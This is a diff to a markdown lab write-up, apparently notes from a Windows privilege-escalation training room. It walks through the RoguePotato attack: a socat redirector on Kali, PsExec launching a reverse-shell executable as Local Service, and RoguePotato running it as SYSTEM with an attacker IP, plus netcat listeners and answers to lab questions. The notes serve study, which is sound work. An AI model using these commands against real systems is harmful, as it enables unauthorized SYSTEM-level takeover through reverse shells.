@@ -1836,29 +1836,147 @@ nc -lnvp 4444
 - <details>
       <summary>Rogue Potato</summary>
 
+     
+     
+     > ## - In Windows, every process runs under a Security Token that determines its privileges.
+     >    - Some services have high permissions, such as LOCAL SERVICE or SYSTEM.
+     > ## - If you can "borrow" or "obtain" a token from a service that has high privileges, you can run your program with the same privileges.
+     > ## - When you send ``reverse.exe`` to Windows, it is a simple program that attempts to make a reverse connection to the Kali machine.
+     >    - If you run it as Admin, it will work with your current permissions. If you run it as a Local Service, it will run with less privileges.
+     >>  ** `The goal: to gain an “entry point” into the system, regardless of the initial permissions.`**
+     > ## **`PSExec`** is a tool from Sysinternals that allows you to run any program on any Windows machine, and even set the privileges of a specific user or service.
+     > ## **`RoguePotato`** It is an Executable/Script that exploits a vulnerability in the Windows system.
+     >> #### - **`Its function: Run any program on the device with SYSTEM privileges by exploiting Windows COM / Service Tokens.`**
+     >>    -  In Windows, every service has a token that defines its permissions.
+     >>    -  Some services have SYSTEM privileges.
+     >>    -  RoguePotato exploits a weakness in permissions or COM objects that allows a normal process (such as a Local Service) to "borrow" the SYSTEM privileges service's Token.
+     >>    -  After that, any program you run with this Token (such as reverse.exe) will run with SYSTEM privileges.
+     
+     
+     ## 1. Run socat redirector on Kali
+     
+     ```ruby
+     sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
+     ```
+     
+     - **`socat`** : A program that allows us to create a redirect or proxy for communication between two sockets (TCP/UDP).
+     - **`tcp-listen:135`** : Listen on port 135 in Kali.
+        - `135` : is the RPC Endpoint Mapper port that Windows uses.
+     - **`reuseaddr`** : It allows port reuse even if sessions are open.
+     - **`fork`** : A fork is used for each new connection (meaning it can serve more than one connection).
+     - **`tcp:MACHINE_IP:9999`** : Any connection that comes to Kali:135, send it to the Windows victim on port 9999.
+     
+     
+     
+     
+     <details>
+          <summary>why not netcat??</summary>
+     
+          
+     ### When we use nc directly
+          
+     ```ruby
+     nc -lnvp 9999
+     ```
+          
+     - This is a normal listener on Kali that waits for any connection from Windows on port 9999.
+     - Problem: In some scenarios, the exploit or reverse shell on Windows will not be able to connect directly to the listener, especially if:
+       - The port that the original program is trying to open is not available (for example 135).
+       - There is firewall or NAT blocking. 
+          
+     ---
+          
+     ### when we use socat redirector
+          
+     ```ruby
+     sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
+     ```
+          
+     - This does Port Forwarding / Redirector:
+       - Any connection coming to Kali on port 135 will automatically switch to the listener on port 9999.
+     - Advantages:
+       - We can emulate or redirect any port required by exploit.
+       - It is useful if the payload on Windows is designed to connect to a specific port (here 135).
+       - fork allows socat to accept more than one connection at the same time.  
+          
+     ---
+          
+     ### Practical difference
+          
+     | Property                                          | nc -lnvp 9999   | socat tcp-listen:135 → 9999    |
+     | ------------------------------------------------- | --------------- | ------------------------------ |
+     | Type of use                                       | Listener normal | Port forwarding + listener     |
+     | Number of connections                             | One for each order       | multi(`fork`)                  |
+     | Adjustable port payload                           | less            |Any port you want can be redirected |
+     | Suitable for exploits that expect a specific port | less           |             excellent                    |
+              
+     
+     
+     
+          
+     </details>
+     
+     
+     
+     > ---
+     > ### 📌 _Goal → Any incoming connection on Kali from port 135 will automatically be routed to the listener on port 9999 to facilitate reception of the reverse shell from Windows._
+     > ---
+     
+     
+     ## 2. Run PSExec64.exe
+     
+     
+     ```ruby
+     C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+     ```
+     
+     - **`C:\PrivEsc\PSExec64.exe`** : A tool from Sysinternals that we use to run commands as another user.
+     - **`-i`** : `interactive session` (links to the current desktop session).
+     - **`-u "nt authority\local service"`** : We operate as a Local Service account.
+     - **`C:\PrivEsc\reverse.exe`** : reverse shell file
+     
+     
+     > ---
+     > ### 📌 _Goal → take a new shell, but as a Local Service (not Administrator)._
+     > ---
+     
+     
+     ## 3. run RoguePotato
+     
+     
+     ```ruby
+     C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
+     ```
+     
+     - **`RoguePotato`** : It is an Executable/Script that exploits a vulnerability in the Windows system.
+     - **`-r 10.10.10.10`** : kali Ip that socat run on it
+     - **`-e "C:\PrivEsc\reverse.exe"`** : file we want to run it as `SYSTEM`
+     - **`-l 9999`** : port that RoguePotato will use it to internal redirect
+     
+     
+     > ---
+     > ### 📌 _Goal → RoguePotato exploits DCOM/RPC to request a token from the SYSTEM account and then uses it to run your program as SYSTEM._
+     > ---
 
-## 1. Run socat redirector on Kali
 
 
-```ruby
-sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
-```
-
-- **`socat`** : A program that allows us to create a redirect or proxy for communication between two sockets (TCP/UDP).
-- **`tcp-listen:135`** : Listen on port 135 in Kali.
-   - `135` : is the RPC Endpoint Mapper port that Windows uses.
-- **`reuseaddr`** : It allows port reuse even if sessions are open.
-- **`fork`** : A fork is used for each new connection (meaning it can serve more than one connection).
-- **`tcp:MACHINE_IP:9999`** : Any connection that comes to Kali:135, send it to the Windows victim on port 9999.
-
-
-
-
-
-
-> ---
-> ### 📌 _Goal → We make a redirect to port 135 used by the exploit (RoguePotato), so that instead of going to Windows itself, it goes to Kali and from there we return it again._
-> ---
+     > # **`Name one user privilege that allows this exploit to work.`**
+     
+     ```perl
+     SeImpersonatePrivilege
+     ```
+     
+     - **`This is the permission that allows the process to “borrow” the permissions of any token present on the system, and this is the basis that RoguePotato exploits.`**
+     
+     
+     > # **`Name the other user privilege that allows this exploit to work.`**
+     
+     ```perl
+     SeAssignPrimaryTokenPrivilege
+     ```
+     
+     - **`This is the permission that allows a new token to be assigned to any process, and completes the process that RoguePotato uses to access the system.`**
+          
 
 
 
